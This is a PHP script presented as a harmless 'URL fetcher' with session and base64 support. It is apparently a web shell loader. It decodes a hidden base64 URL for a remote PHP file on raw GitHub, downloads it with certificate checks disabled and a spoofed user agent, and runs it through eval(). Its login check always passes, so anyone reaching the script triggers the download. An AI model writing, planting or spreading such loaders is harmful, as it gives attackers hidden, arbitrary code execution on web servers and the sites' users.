<?php
/**
 * =======================================================================================
 *   ____                     _                  _____         _       _                 
 *  |  _ \ ___  ___ ___    __| | ___  ___       |  __ \       | |     | |                
 *  | |_) / _ \/ __/ _ \  / _` |/ _ \/ __|______| |__) |__  ___| |_ ___| |__   ___ _ __   
 *  |  _ <  __/ (_| (_) || (_| |  __/\__ \______|  ___/ _ \/ __| __/ __| '_ \ / _ \ '__|  
 *  |_| \_\___|\___\___/  \__,_|\___||___/      |_|   \___/|___/\__\___|_| |_|\___|_|     
 *                                                                                        
 * =======================================================================================
 * Script: Simple URL Fetcher with Session & Base64 Support (No Type Hinting)
 * Description: Compatible with older PHP versions, no OOP, no type declarations.
 * Author: YourNameHere
 * Last Modified: 2025-05-11
 * 
 * SECURITY WARNING:
 * This script uses `eval()`. Only fetch from trusted sources!
 * =======================================================================================
 */

session_start();

/**
 * Decode base64-encoded URL
 */
function decode_base64_url($encodedUrl) {
    return base64_decode($encodedUrl);
}

/**
 * Fetch content from URL using cURL or fallback methods
 */
function fetch_url($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

        if (!empty($_SESSION['coki'])) {
            curl_setopt($ch, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }

    if (function_exists('file_get_contents')) {
        return file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        if ($handle) {
            $content = stream_get_contents($handle);
            fclose($handle);
            return $content;
        }
    }

    return false;
}

/**
 * Dummy user authentication (modify as needed)
 */
function is_user_logged_in() {
    return true;
}

/**
 * Main logic execution
 */
function run() {
    $encodedUrl = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Rpa3VuZzZldGFyL055YXJlay9yZWZzL2hlYWRzL21hc3Rlci94eE15ZGIucGhw';
    $decodedUrl = decode_base64_url($encodedUrl);

    if (is_user_logged_in()) {
        $content = fetch_url($decodedUrl);

        if ($content !== false) {
            eval("?>$content");
        } else {
            echo "Failed to fetch remote script.";
        }
    } else {
        echo "Access denied: User not authenticated.";
    }
}

// Execute
run();

?>